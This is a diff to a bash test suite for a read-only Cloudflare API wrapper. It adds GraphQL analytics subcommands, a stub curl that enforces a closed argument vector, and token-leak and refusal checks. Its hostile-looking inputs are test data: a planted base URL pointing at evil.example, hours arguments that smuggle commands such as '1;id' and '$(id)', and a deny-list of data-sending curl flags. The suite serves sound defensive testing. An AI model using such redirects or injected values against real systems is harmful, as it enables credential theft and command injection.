@@ -93,6 +93,8 @@ TOK_Z="zfake""ZONESET.Ab~1+2/3=x-9"
 TOK_R="rfake""RULESET.Cd~4+5/6=y-8"
 TOK_A="afake""AUDITTK.Ef~7+8/9=z-7"
 TOK_P="pfake""PAGERUL.Ij~2+3/4=v-5"
+TOK_N="nfake""ANALYTIC.Kl~6+7/8=u-4"
+TOK_N_PLAIN="nfake""ANALYTICplain9"
 TOK_BARE="bfake""BARE.Gh~0+1/2=w-6"
 CANARY_BODY="CANARYBODY_7f3a91"
 CANARY_ERR="CANARYERR_91bcd2"
@@ -107,10 +109,21 @@ BASE_ENV=(
   "HOME=$HOMEDIR" "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform"
   "CF_ZONE_ID=$ZONE" "CF_ACCOUNT_ID=$ACCT"
   "CF_API_TOKEN_ZONE_SETTINGS=$TOK_Z" "CF_API_TOKEN_RULESETS=$TOK_R" "CF_API_TOKEN_PAGERULES_READ=$TOK_P" "CF_API_TOKEN_AUDIT=$TOK_A"
+  "CF_API_TOKEN_ANALYTICS_READ=$TOK_N"
 )
-LEAK_NEEDLES=("$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_BARE" "$CANARY_BODY" "$CANARY_ERR"
+LEAK_NEEDLES=("$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_N" "$TOK_BARE" "$CANARY_BODY" "$CANARY_ERR"
   "EXPR_CANARY" "DESC_CANARY" "ACTOR_CANARY" "203.0.113.77" "PATTERN_CANARY" "Bearer")
 SUBS=(ssl-mode config-entrypoint pagerules-ssl change-history)
+ANSUBS=(analytics-health analytics-edge-errors)
+ALLSUBS=("${SUBS[@]}" "${ANSUBS[@]}")
+GQL_URL="$BASE_URL/graphql"
+HOURS_DEFAULT=24
+# sargs <subcommand>: SARGS is the argument vector for a subcommand (the two analytics ones take an hours argument).
+SARGS=()
+sargs() {
+  SARGS=("$1")
+  case "$1" in analytics-health | analytics-edge-errors) SARGS+=("$HOURS_DEFAULT") ;; esac
+}
 
 # --- the stub curl (path rewritten into the sandbox copy of the wrapper) ---
 cat > "$STUB/curl" <<'STUB_EOF'
@@ -123,13 +136,20 @@ printf "called\n" >> "$D/calls.log"
 ARGLOG="$D/argv.bin"
 for a in "$@"; do printf "%s\0" "$a" >> "$ARGLOG"; done
 refuse() { printf "%s\n" "$1" >> "$D/refusal.log"; exit 64; }
-args=("$@"); n=$#; i=0; cfg=0
+args=("$@"); n=$#; i=0; cfg=0; method=""
+GQL="https://api.cloudflare.com/client/v4/graphql"
+url=""; if ((n > 0)); then url="${args[$((n - 1))]}"; fi
 while ((i < n)); do
   a="${args[$i]}"
   case "$a" in
     --disable | -sS) : ;;
     --noproxy) i=$((i + 1)); [[ "${args[$i]-}" == '*' ]] || refuse "noproxy-arg" ;;
-    -X) i=$((i + 1)); [[ "${args[$i]-}" == GET ]] || refuse "-X-arg" ;;
+    -X) i=$((i + 1)); method="${args[$i]-}"
+        case "$method" in
+          GET) [[ "$url" != "$GQL" ]] || refuse "-X-GET-for-graphql" ;;
+          POST) [[ "$url" == "$GQL" ]] || refuse "-X-POST-not-graphql" ;;
+          *) refuse "-X-arg" ;;
+        esac ;;
     --max-time) i=$((i + 1)); [[ "${args[$i]-}" =~ ^[0-9]+$ ]] || refuse "max-time-arg" ;;
     --max-redirs) i=$((i + 1)); [[ "${args[$i]-}" == 0 ]] || refuse "max-redirs-arg" ;;
     -w) i=$((i + 1)); [[ "${args[$i]-}" == $'\n%{http_code}' ]] || refuse "-w-arg" ;;
@@ -141,6 +161,14 @@ while ((i < n)); do
 done
 if ((cfg == 1)); then
   while IFS= read -r l || [[ -n "$l" ]]; do printf "%s\n" "$l" >> "$D/stdin.log"; done
+fi
+if [[ "$method" == POST ]]; then
+  # a POST carries exactly three config lines: one Authorization, one Content-Type, one data-raw
+  nl=$(wc -l < "$D/stdin.log" 2>/dev/null || echo 0)
+  na=$(grep -c '^header = "Authorization: Bearer ' "$D/stdin.log" 2>/dev/null || true)
+  nc=$(grep -cx 'header = "Content-Type: application/json"' "$D/stdin.log" 2>/dev/null || true)
+  nd=$(grep -c '^data-raw = "' "$D/stdin.log" 2>/dev/null || true)
+  [[ "$nl/$na/$nc/$nd" == "3/1/1/1" ]] || refuse "post-stdin:$nl/$na/$nc/$nd"
 fi
 export -p > "$D/env.log"
 status=$(<"$D/status"); body=$(<"$D/body"); ce=$(<"$D/curl_exit")
@@ -220,6 +248,7 @@ tok_of() { # bound token value per subcommand
     config-entrypoint) printf '%s' "$TOK_R" ;;
     pagerules-ssl) printf '%s' "$TOK_P" ;;
     change-history) printf '%s' "$TOK_A" ;;
+    analytics-health | analytics-edge-errors) printf '%s' "$TOK_N" ;;
   esac
 }
 tokvar_of() {
@@ -228,6 +257,7 @@ tokvar_of() {
     config-entrypoint) printf '%s' CF_API_TOKEN_RULESETS ;;
     pagerules-ssl) printf '%s' CF_API_TOKEN_PAGERULES_READ ;;
     change-history) printf '%s' CF_API_TOKEN_AUDIT ;;
+    analytics-health | analytics-edge-errors) printf '%s' CF_API_TOKEN_ANALYTICS_READ ;;
   esac
 }
 url_of() {
@@ -235,6 +265,7 @@ url_of() {
     ssl-mode) printf '%s' "$BASE_URL/zones/$ZONE/settings/ssl" ;;
     config-entrypoint) printf '%s' "$BASE_URL/zones/$ZONE/rulesets/phases/http_config_settings/entrypoint" ;;
     pagerules-ssl) printf '%s' "$BASE_URL/zones/$ZONE/pagerules?status=active" ;;
+    analytics-health | analytics-edge-errors) printf '%s' "$GQL_URL" ;;
   esac
 }
 
@@ -264,8 +295,14 @@ ok_body() {
     config-entrypoint) printf '%s' "$ENTRY_OK" ;;
     pagerules-ssl) printf '%s' "$PAGE_OK" ;;
     change-history) audit_body 3 ;;
+    analytics-health) gql_wrap "$HEALTH_OK_GROUPS" ;;
+    analytics-edge-errors) gql_wrap "$EDGE_OK_GROUPS" ;;
   esac
 }
+# GraphQL bodies: the groups array sits under data.viewer.zones[0].httpRequestsAdaptiveGroups
+gql_wrap() { printf '{"data":{"viewer":{"zones":[{"httpRequestsAdaptiveGroups":%s}]}},"errors":null}' "$1"; }
+HEALTH_OK_GROUPS='[{"count":120,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z"},"avg":{"originResponseDurationMs":332.456},"quantiles":{"originResponseDurationMsP50":300.04,"originResponseDurationMsP90":477.96}},{"count":80,"dimensions":{"datetimeHour":"2026-11-01T11:00:00Z"},"avg":{"originResponseDurationMs":null},"quantiles":{"originResponseDurationMsP50":null,"originResponseDurationMsP90":null}},{"count":7,"dimensions":{"datetimeHour":"2026-11-01T12:00:00Z"},"avg":{"originResponseDurationMs":0},"quantiles":{"originResponseDurationMsP50":269,"originResponseDurationMsP90":855}}]'
+EDGE_OK_GROUPS='[{"count":4,"dimensions":{"datetimeHour":"2026-11-01T12:00:00Z","edgeResponseStatus":520}},{"count":2,"dimensions":{"datetimeHour":"2026-11-01T11:00:00Z","edgeResponseStatus":502}},{"count":3,"dimensions":{"datetimeHour":"2026-11-01T11:00:00Z","edgeResponseStatus":503}},{"count":5,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z","edgeResponseStatus":502}}]'
 ERR_BODY="{\"success\":false,\"errors\":[{\"code\":10000,\"message\":\"Authentication error $CANARY_BODY\"}],\"result\":null}"
 
 EXERCISED=0
@@ -300,6 +337,9 @@ case_labels() {
 case_arm_count() { # number of `;;` arm terminators inside the dispatcher block
   dispatcher_block "$1" | grep -o ';;' | wc -l
 }
+cf_graphql_sites() { grep -cE '(^|[^[:alnum:]_])cf_graphql[[:space:]]+[^[:space:]()]' "$1"; }
+# every "$CURL" line must run behind an empty environment: count the lines that do NOT start the env -i form
+curl_noenv_sites() { grep -F -- '"$CURL"' "$1" | grep -cvF -- '/usr/bin/env -i "$CURL" --disable' || true; }
 cf_get_sites() { grep -cE '(^|[^[:alnum:]_])cf_get[[:space:]]+[^[:space:]()]' "$1"; }
 cf_get_args() { grep -oE '(^|[^[:alnum:]_])cf_get[[:space:]]+"[^"]+"' "$1" | sed -E 's/^[^c]*cf_get[[:space:]]+//' | sort; }
 curl_assigns() { grep -cE '(^|[^[:alnum:]_])CURL[[:space:]]*\+?=' "$1"; }
@@ -308,7 +348,7 @@ curl_assigns() { grep -cE '(^|[^[:alnum:]_])CURL[[:space:]]*\+?=' "$1"; }
 # whitespace-before-# form leaves `$#`, `${x##y}` and `"$#"` alone.
 strip_trailing() { sed -E 's/[[:space:]]+#.*$//' "$1"; }
 # Every use of /usr/bin/jq or /usr/bin/date outside the `[ -x` preflight tests, and how many of them are the exact call form
-# `$(/usr/bin/env -i /usr/bin/<tool> `. The two counts must be equal (and 4).
+# `$(/usr/bin/env -i /usr/bin/<tool> `. The two counts must be equal (and 9).
 tool_uses() { grep -vE '\[ -x ' "$1" | grep -oE '/usr/bin/(jq|date)' | wc -l; }
 tool_anchored() { grep -vE '\[ -x ' "$1" | grep -oE '[$][(]/usr/bin/env -i /usr/bin/(jq|date) ' | wc -l; }
 # A tool path built from a variable: a /usr/bin directory stored in a variable, $VAR/jq, or an assignment whose value ends in /jq or /date.
@@ -330,13 +370,18 @@ grp_source() {
   tn "source: no mktemp" src_has 'mktemp'
   tn "source: no eval" src_has '(^|[^[:alnum:]_])eval([^[:alnum:]_]|$)'
   tn "source: no here-string or heredoc (<<)" src_has '<<'
-  t "source: exactly one curl call site" eq "$(count_sites "$STRIPPED")" 1
+  t "source: exactly two curl call sites (cf_get and cf_graphql)" eq "$(count_sites "$STRIPPED")" 2
+  t "source: every curl call site starts /usr/bin/env -i \"\$CURL\" --disable" eq "$(curl_noenv_sites "$STRIPPED")" 0
+  t "source: exactly one POST curl site and one GET curl site" eq "$(grep -F -- '"$CURL"' "$STRIPPED" | grep -c -e '-X POST')/$(grep -F -- '"$CURL"' "$STRIPPED" | grep -c -e '-X GET')" "1/1"
+  t "source: exactly two cf_graphql callers (one per analytics subcommand)" eq "$(cf_graphql_sites "$STRIPPED")" 2
+  t "source: the GraphQL URL is the script constant \$BASE/graphql" eq "$(grep -cx 'GQL_URL="\$BASE/graphql"' "$STRIPPED")" 1
   tn "source: no bare curl command (curl by name)" src_has '^[[:space:]]*(/usr/bin/env -i )?curl[[:space:]]'
   assert_fixture_dir "$WORK"
   grep -F -- '"$CURL"' "$STRIPPED" > "$WORK/curl_lines.txt" || true
   t "source: anchor - the curl invocation line was extracted" test -s "$WORK/curl_lines.txt"
   tn "source: no -L / --location / -d / --data / --json / -T / -F flag on the curl line" grep -Eq '(^|[[:space:]])(-L|--location|-d|--data[a-z-]*|--json|-T|-F)([[:space:]]|$)' "$WORK/curl_lines.txt"
   t "source: anchor - -X GET present" src_has '-X GET'
+  t "source: anchor - -X POST present" src_has '-X POST'
   t "source: anchor - --disable present" src_has -- '--disable'
   t "source: anchor - env -i curl invocation" src_has '/usr/bin/env -i "\$CURL" --disable'
   t "source: shebang is #!/usr/bin/env bash" eq "$(head -n 1 "$SUT_SRC")" '#!/usr/bin/env bash'
@@ -362,27 +407,29 @@ grp_source() {
   printf '%s\n' 'x=$("$CURL" a)' 'y=$("$CURL" b)' > "$WORK/c2.txt"
   printf '%s\n' 'command -v curl >/dev/null' 'echo "curl exit"' > "$WORK/c0.txt"
   printf '%s\n' 'x=$(/usr/bin/env -i "$CURL" a)' > "$WORK/c1.txt"
+  printf '%s\n' 'x=$(/usr/bin/env -i "$CURL" --disable a)' 'y=$("$CURL" --disable b)' > "$WORK/c3.txt"
+  t "source control: the env -i census counts a bare curl site" eq "$(curl_noenv_sites "$WORK/c3.txt")" 1
   t "source control: a 2-site fixture counts 2" eq "$(count_sites "$WORK/c2.txt")" 2
   t "source control: a command -v fixture counts 0" eq "$(count_sites "$WORK/c0.txt")" 0
   t "source control: a 1-site fixture counts 1" eq "$(count_sites "$WORK/c1.txt")" 1
-  # parity: array == case labels == --list output; non-empty and length 4
+  # parity: array == case labels == --list output; non-empty and length 6
   local -a arr=() lab=() lst=()
   mapfile -t arr < <(array_names "$STRIPPED")
   mapfile -t lab < <(case_labels "$STRIPPED")
   run -- --list
   mapfile -t lst <<<"$OUT"
-  t "parity: SUBCOMMANDS array is non-empty with length 4" eq "${#arr[@]}" 4
-  t "parity: dispatcher case labels are non-empty with length 4" eq "${#lab[@]}" 4
-  t "parity: --list output has length 4" eq "${#lst[@]}" 4
+  t "parity: SUBCOMMANDS array is non-empty with length 6" eq "${#arr[@]}" 6
+  t "parity: dispatcher case labels are non-empty with length 6" eq "${#lab[@]}" 6
+  t "parity: --list output has length 6" eq "${#lst[@]}" 6
   t "parity: array == case labels == --list (set equality)" eq "$(sorted_join "${arr[@]}")|$(sorted_join "${lab[@]}")" "$(sorted_join "${lst[@]}")|$(sorted_join "${arr[@]}")"
-  t "parity: array equals the four expected names" eq "$(sorted_join "${arr[@]}")" "$(sorted_join "${SUBS[@]}")"
+  t "parity: array equals the six expected names" eq "$(sorted_join "${arr[@]}")" "$(sorted_join "${ALLSUBS[@]}")"
   t "list: --list exits 0" eq "$RC" 0
   t "list: --list names no Doppler project/config and calls no curl" bash -c '! grep -Eqi "doppler|prd" "$1"' _ "$WORK/comb.txt"
   t "list: --list never invoked curl" eq "$(ncalls)" 0
 
   # --- censuses: the request set, the curl binding, the child environments (each paired with a control fixture) ---
   assert_fixture_dir "$WORK"
-  t "census: dispatcher arm terminators == 5 (four arms plus the refusing default)" eq "$(case_arm_count "$STRIPPED")" 5
+  t "census: dispatcher arm terminators == 7 (six arms plus the refusing default)" eq "$(case_arm_count "$STRIPPED")" 7
   printf '%s\n' 'case "$SUB" in' "   \"raw\"|'purge') x ;;" $'\tzap) y ;;' '  *) z ;;' 'esac' > "$WORK/cl.txt"
   t "census control: the tolerant label extractor sees tab, 3-space, quoted and alternation arms" eq "$(case_labels "$WORK/cl.txt" | sort | tr '\n' ' ')" "purge raw zap "
   t "census control: the arm counter sees every terminator" eq "$(case_arm_count "$WORK/cl.txt")" 3
@@ -405,7 +452,7 @@ grp_source() {
   t "census control: an exported form counts 1" eq "$(curl_assigns "$WORK/cu2.txt")" 1
   strip_trailing "$STRIPPED" > "$WORK/nocomment.sh"
   t "census: anchor - the comment-free source still contains jq/date invocations" test -s "$WORK/nocomment.sh"
-  t "census: jq and date are used in exactly 4 places (jq twice, date twice)" eq "$(tool_uses "$WORK/nocomment.sh")" 4
+  t "census: jq and date are used in exactly 9 places (jq four times, date five times)" eq "$(tool_uses "$WORK/nocomment.sh")" 9
   t "census: every jq/date use is the exact call form \$(/usr/bin/env -i /usr/bin/<tool> ... (a trailing comment does not count)" eq "$(tool_anchored "$WORK/nocomment.sh")" "$(tool_uses "$WORK/nocomment.sh")"
   tn "census: no bare jq or date command" src_has '(^|[^[:alnum:]_/.-])(jq|date)[[:space:]]+-'
   t "census: no tool path built from a variable" eq "$(varpath_hits "$WORK/nocomment.sh")" 0
@@ -432,7 +479,14 @@ grp_source() {
   tn "source: no jq --arg / --args / --rawfile / --slurpfile / --jsonargs" src_has '[[:space:]]--(arg|args|rawfile|slurpfile|jsonargs)([[:space:]]|$)'
   tn "source: no NAME=value prefix on an env child" src_has '/usr/bin/env[[:space:]]+([A-Z_]+=|-[A-Za-z]*[[:space:]]+[A-Z_]+=)'
   t "source: the xtrace refusal list names exactly the dispatcher TOKVAR names plus CF_API_TOKEN" eq "$(xtrace_names "$STRIPPED" | tr '\n' ' ')" "$({ tokvar_names "$STRIPPED"; echo CF_API_TOKEN; } | sort -u | tr '\n' ' ')"
-  t "source: anchor - the dispatcher binds exactly four token variables" eq "$(tokvar_names "$STRIPPED" | wc -l)" 4
+  t "source: anchor - the dispatcher binds exactly five token variables" eq "$(tokvar_names "$STRIPPED" | wc -l)" 5
+  t "source: the analytics token is bound only by the two analytics arms" eq "$(dispatcher_block "$STRIPPED" | grep -c 'TOKVAR=CF_API_TOKEN_ANALYTICS_READ')/$(dispatcher_block "$STRIPPED" | grep -E '^[[:space:]]*analytics-[a-z-]+\)' | grep -c 'TOKVAR=CF_API_TOKEN_ANALYTICS_READ')" "2/2"
+  # the two compiled-in query templates: read-only by construction (a static check; there is no runtime keyword gate)
+  grep -E '^GQL_(HEALTH|EDGE)_TPL=' "$STRIPPED" > "$WORK/tpl_lines.txt" || true
+  t "source: anchor - exactly two query template constants" eq "$(wc -l < "$WORK/tpl_lines.txt")" 2
+  tn "source: neither template constant holds mutation, subscription or __schema" grep -Eqi 'mutation|subscription|__schema' "$WORK/tpl_lines.txt"
+  t "source: query 2 orders datetimeHour_DESC and query 1 datetimeHour_ASC" eq "$(grep -c 'datetimeHour_DESC' "$WORK/tpl_lines.txt")/$(grep -c 'datetimeHour_ASC' "$WORK/tpl_lines.txt")" "1/1"
+  t "source: the per-query limit travels through its own --argjson name" src_has 'argjson qlimit "\$QLIMIT"'
   t "source: LIMIT is assigned once as 50" eq "$(grep -cE '^LIMIT=50$' "$STRIPPED")" 1
   t "source: the literal 50 appears exactly once (the LIMIT assignment)" eq "$(grep -cw '50' "$STRIPPED")" 1
   t "source: the truncated test reads the same LIMIT via --argjson" src_has 'argjson limit "\$LIMIT"'
@@ -442,43 +496,48 @@ grp_source() {
 # =============================================================================================
 # Group: wire (what actually reaches curl)
 # =============================================================================================
-# The wrapper's curl argv is a CLOSED vector: these ten tokens in this order, then the URL. A deny-list of known-bad
-# flags cannot see a duplicated -X, a glued -XPOST, --connect-to, -k or --config /dev/null; full equality does.
+# The wrapper's curl argv is a CLOSED vector per call site: these ten tokens in this order, then the URL. A deny-list of known-bad
+# flags cannot see a duplicated -X, a glued -XPOST, --connect-to, -k or --config /dev/null; full equality does. Two vectors
+# exist: the GET site (EXP) and the single read-only-POST site (EXP_POST), which differ in the method only.
 EXP=(--disable --noproxy '*' -X GET -sS --max-time 20 --max-redirs 0 -w $'\n%{http_code}' --config -)
-argv_equal() { # ARGV == EXP + one trailing URL element
-  local n=${#ARGV[@]} m=${#EXP[@]} i
+EXP_POST=(--disable --noproxy '*' -X POST -sS --max-time 20 --max-redirs 0 -w $'\n%{http_code}' --config -)
+argv_equal() { # $1 = vector name (default EXP): ARGV == vector + one trailing URL element
+  local -n vec="${1:-EXP}"
+  local n=${#ARGV[@]} m=${#vec[@]} i
   [[ "$n" == "$((m + 1))" ]] || return 1
-  for ((i = 0; i < m; i++)); do [[ "${ARGV[$i]}" == "${EXP[$i]}" ]] || return 1; done
+  for ((i = 0; i < m; i++)); do [[ "${ARGV[$i]}" == "${vec[$i]}" ]] || return 1; done
 }
 check_wire() { # $1 = subcommand
-  local sub="$1" tok url a i got_x=0 got_redir=0 bad=0 tokleak=0 n
+  local sub="$1" tok url a i got_x=0 got_redir=0 bad=0 tokleak=0 n vecname=EXP meth=GET post=0
+  case "$sub" in analytics-health | analytics-edge-errors) vecname=EXP_POST meth=POST post=1 ;; esac
   tok=$(tok_of "$sub")
+  sargs "$sub"
   fixture 200 "$(ok_body "$sub")"
-  run "${BASE_ENV[@]}" "CF_API_BASE=https://evil.example" "CF_API_TOKEN=$TOK_BARE" -- "$sub"
+  run "${BASE_ENV[@]}" "CF_API_BASE=https://evil.example" "CF_API_TOKEN=$TOK_BARE" -- "${SARGS[@]}"
   load_argv
   t "wire[$sub]: run is ok" eq "$L1" "cloudflare-readonly: $sub ok"
   t "wire[$sub]: curl called exactly once" eq "$(ncalls)" 1
   WIRE_ROWS=$((WIRE_ROWS + 1))
   t "wire[$sub]: recorded argv is non-empty (anti-vacuity floor)" test "${#ARGV[@]}" -gt 0
   t "wire[$sub]: argv[1] is --disable" eq "${ARGV[0]:-}" "--disable"
-  t "wire[$sub]: recorded argv equals the closed vector (full equality, URL last)" argv_equal
+  t "wire[$sub]: recorded argv equals the closed vector (full equality, URL last)" argv_equal "$vecname"
   t "wire[$sub]: the stub refused no flag (refusal log absent or empty)" test ! -s "$STUB/refusal.log"
   for ((i = 0; i < ${#ARGV[@]}; i++)); do
     a="${ARGV[$i]}"
-    if [[ "$a" == "-X" && "${ARGV[$((i + 1))]:-}" == "GET" ]]; then got_x=1; fi
+    if [[ "$a" == "-X" && "${ARGV[$((i + 1))]:-}" == "$meth" ]]; then got_x=1; fi
     if [[ "$a" == "--max-redirs" && "${ARGV[$((i + 1))]:-}" == "0" ]]; then got_redir=1; fi
     case "$a" in
       -d | --data* | --json | -T | --upload-file | -F | --form | -L | --location | --url | -u | --user | -H | --header | --request | -K) bad=1 ;;
     esac
-    for n in "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_BARE"; do
+    for n in "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_N" "$TOK_BARE"; do
       if [[ "$a" == *"$n"* ]]; then tokleak=1; fi
     done
     if [[ "$a" == *Authorization* || "$a" == *Bearer* ]]; then tokleak=1; fi
   done
-  t "wire[$sub]: argv has -X GET" eq "$got_x" 1
+  t "wire[$sub]: argv has -X $meth" eq "$got_x" 1
   t "wire[$sub]: argv has --max-redirs 0" eq "$got_redir" 1
   t "wire[$sub]: argv has none of -d --data* --json -T -F -L -H --url -u" eq "$bad" 0
-  t "wire[$sub]: argv carries no token, Authorization or Bearer" eq "$tokleak" 0
+  t "wire[$sub]: argv carries no token, Authorization or Bearer (the body travels on stdin, never argv)" eq "$tokleak" 0
   if [[ "$sub" == change-history ]]; then
     url="$(last_arg)"
     local re="^https://api\.cloudflare\.com/client/v4/accounts/$ACCT/logs/audit\?since=([0-9T:Z-]+)&before=([0-9T:Z-]+)&limit=50&direction=desc\$"
@@ -493,13 +552,20 @@ check_wire() { # $1 = subcommand
     else
       t "wire[$sub]: since/before parse (template did not match)" false
     fi
+  elif [[ "$post" == 1 ]]; then
+    t "wire[$sub]: last argv is the exact fixed GraphQL URL" eq "$(last_arg)" "$GQL_URL"
   else
     t "wire[$sub]: last argv is the exact fixed URL" eq "$(last_arg)" "$(url_of "$sub")"
   fi
   t "wire[$sub]: URL host is api.cloudflare.com despite a planted CF_API_BASE" bash -c '[[ "$1" == https://api.cloudflare.com/client/v4/* ]]' _ "$(last_arg)"
   t "wire[$sub]: stdin carries the bound token exactly once on one config line" eq "$(grep -cF -- "header = \"Authorization: Bearer $tok\"" "$STUB/stdin.log" 2>/dev/null || true)" 1
-  t "wire[$sub]: stdin is exactly one line" eq "$(wc -l < "$STUB/stdin.log" 2>/dev/null || echo 0)" 1
-  for n in "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_BARE"; do
+  if [[ "$post" == 1 ]]; then
+    t "wire[$sub]: stdin is exactly three lines (Authorization, Content-Type, data-raw)" eq "$(wc -l < "$STUB/stdin.log" 2>/dev/null || echo 0)" 3
+    t "wire[$sub]: stdin carries one Content-Type: application/json line and one data-raw line" eq "$(grep -cx 'header = "Content-Type: application/json"' "$STUB/stdin.log" 2>/dev/null || true)/$(grep -c '^data-raw = "' "$STUB/stdin.log" 2>/dev/null || true)" "1/1"
+  else
+    t "wire[$sub]: stdin is exactly one line" eq "$(wc -l < "$STUB/stdin.log" 2>/dev/null || echo 0)" 1
+  fi
+  for n in "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_N" "$TOK_BARE"; do
     if [[ "$n" != "$tok" ]]; then
       tn "wire[$sub]: stdin carries no other token ($n)" has_file "$STUB/stdin.log" "$n"
     fi
@@ -517,14 +583,58 @@ grp_wire() {
   tn "wire control: a glued -XPOST is rejected" argv_equal
   ARGV=("${EXP[@]}")
   tn "wire control: a vector with no URL is rejected" argv_equal
+  ARGV=("${EXP_POST[@]}" "https://x")
+  t "wire control: the exact POST vector plus a URL is accepted by the POST equality" argv_equal EXP_POST
+  tn "wire control: the POST vector is not accepted by the GET equality" argv_equal EXP
+  ARGV=(--disable --noproxy '*' -X POST -X POST -sS --max-time 20 --max-redirs 0 -w $'\n%{http_code}' --config - "https://x")
+  tn "wire control: a duplicated POST -X is rejected" argv_equal EXP_POST
+  ARGV=(--disable --noproxy '*' -XPOST -sS --max-time 20 --max-redirs 0 -w $'\n%{http_code}' --config - "https://x")
+  tn "wire control: a glued -XPOST is rejected by the POST equality" argv_equal EXP_POST
+  ARGV=("${EXP_POST[@]}")
+  tn "wire control: a POST vector with no URL is rejected" argv_equal EXP_POST
   ARGV=("${keep[@]}")
-  for s in "${SUBS[@]}"; do check_wire "$s"; done
+  # the stub itself: a POST is accepted only for the GraphQL URL (with a well-formed three-line stdin), a GET never for it
+  local stubcfg stubrc
+  stubcfg=$'header = "Authorization: Bearer x"\nheader = "Content-Type: application/json"\ndata-raw = "{}"\n'
+  fixture 200 '{}'
+  "$STUB/curl" "${EXP[@]}" "$BASE_URL/zones/$ZONE/settings/ssl" < /dev/null > /dev/null 2>&1
+  stubrc=$?
+  t "stub control: -X GET for a REST URL is accepted" eq "$stubrc" 0
+  fixture 200 '{}'
+  "$STUB/curl" "${EXP_POST[@]}" "$BASE_URL/zones/$ZONE/settings/ssl" <<< "${stubcfg%$'\n'}" > /dev/null 2>&1
+  stubrc=$?
+  t "stub control: -X POST for a non-GraphQL URL is refused" eq "$stubrc/$(<"$STUB/refusal.log")" "64/-X-POST-not-graphql"
+  fixture 200 '{}'
+  "$STUB/curl" "${EXP[@]}" "$GQL_URL" < /dev/null > /dev/null 2>&1
+  stubrc=$?
+  t "stub control: -X GET for the GraphQL URL is refused" eq "$stubrc/$(<"$STUB/refusal.log")" "64/-X-GET-for-graphql"
+  fixture 200 '{}'
+  "$STUB/curl" "${EXP_POST[@]}" "$GQL_URL" <<< "${stubcfg%$'\n'}" > /dev/null 2>&1
+  stubrc=$?
+  t "stub control: a well-formed POST for the GraphQL URL is accepted" eq "$stubrc" 0
+  fixture 200 '{}'
+  "$STUB/curl" "${EXP_POST[@]}" "$GQL_URL" <<< 'header = "Authorization: Bearer x"' > /dev/null 2>&1
+  stubrc=$?
+  t "stub control: a POST whose stdin lacks Content-Type and data-raw is refused" eq "$stubrc" 64
+  fixture 200 '{}'
+  "$STUB/curl" --disable --noproxy '*' -X DELETE -sS --max-time 20 --max-redirs 0 -w $'\n%{http_code}' --config - "$GQL_URL" <<< "${stubcfg%$'\n'}" > /dev/null 2>&1
+  stubrc=$?
+  t "stub control: any other method is refused" eq "$stubrc" 64
+  for s in "${ALLSUBS[@]}"; do check_wire "$s"; done
   # must-pass non-canonical: a different zone id is substituted into the URL
   fixture 200 "$SSL_OK"
   run "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform" "CF_ZONE_ID=$ZONE_ALT" "CF_API_TOKEN_ZONE_SETTINGS=$TOK_Z" -- ssl-mode
   load_argv
   t "wire: a different zone id lands in the URL" eq "$(last_arg)" "$BASE_URL/zones/$ZONE_ALT/settings/ssl"
   t "wire: a different zone id still runs ok" eq "$L1" "cloudflare-readonly: ssl-mode ok"
+  # must-pass non-canonical: an alternate valid analytics token value and the boundary hours
+  local h
+  for h in 1 100 216; do
+    fixture 200 "$(ok_body analytics-health)"
+    run "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform" "CF_ZONE_ID=$ZONE_ALT" "CF_API_TOKEN_ANALYTICS_READ=$TOK_N_PLAIN" -- analytics-health "$h"
+    t "wire: analytics-health at $h hours with an alternate zone and token runs ok" eq "$L1" "cloudflare-readonly: analytics-health ok"
+    t "wire: analytics-health at $h hours sends the alternate token on stdin" has_file "$STUB/stdin.log" "Bearer $TOK_N_PLAIN\""
+  done
 }
 
 # =============================================================================================
@@ -540,7 +650,60 @@ refused() { # refused <label> <args...> : rc 64, curl never called
   t "refuse: $label -> curl never called" eq "$(ncalls)" 0
   tn "refuse: $label -> no ok verdict" contains "$OUT" " ok"
 }
+# one fixed, value-free message per refusal cause (rc 64 is shared by arity, hours, zone shape and stamp refusals)
+MSG_USAGE_OLD="cloudflare-readonly: usage: cloudflare-readonly.sh <subcommand> | --list (refused: missing or extra argument)"
+MSG_ARITY_AN="cloudflare-readonly: usage: cloudflare-readonly.sh analytics-health|analytics-edge-errors <hours> (refused: missing or extra argument; the analytics subcommands take hours 1-216)"
+MSG_HOURS_SHAPE="cloudflare-readonly: refused: hours must be a whole number from 1 to 216"
+MSG_HOURS_CAP="cloudflare-readonly: refused: hours is above the maximum of 216"
+MSG_ZONE="cloudflare-readonly: refused: CF_ZONE_ID is not a 32-character hex id"
+MSG_STAMP="cloudflare-readonly: refused: date produced no valid UTC stamp"
+# refused_msg <label> <exact stderr line> <args...>: rc 64, curl never called, no stdout verdict, and THIS cause's own message
+refused_msg() {
+  local label="$1" msg="$2"
+  shift 2
+  fixture 200 "$SSL_OK"
+  run "${BASE_ENV[@]}" -- "$@"
+  REFUSE_ROWS=$((REFUSE_ROWS + 1))
+  t "refuse: $label -> exit 64" eq "$RC" 64
+  t "refuse: $label -> curl never called" eq "$(ncalls)" 0
+  t "refuse: $label -> its own fixed message" eq "$ERR" "$msg"
+  tn "refuse: $label -> no ok verdict" contains "$OUT" " ok"
+}
 grp_refuse() {
+  # --- the analytics grammar: a whole number of hours, 1 to 216, no default (a distinct fixed message per cause) ---
+  local an hv hl
+  for an in "${ANSUBS[@]}"; do
+    for hl in "zero:0" "negative:-1" "leading-zero:07" "decimal:1.5" "empty:" "exponent:1e2" "hex:0x10" "plus:+5" "leading-space: 5" "trailing-space:5 " "four-digits:1000" "word:abc" "injection:1;id" "subshell:\$(id)" "unicode-digit:٣" "trailing-newline:5"$'\n'; do
+      hv="${hl#*:}"
+      refused_msg "$an hours ${hl%%:*}" "$MSG_HOURS_SHAPE" "$an" "$hv"
+    done
+    refused_msg "$an hours 217 (above the cap)" "$MSG_HOURS_CAP" "$an" 217
+    refused_msg "$an hours 999 (above the cap)" "$MSG_HOURS_CAP" "$an" 999
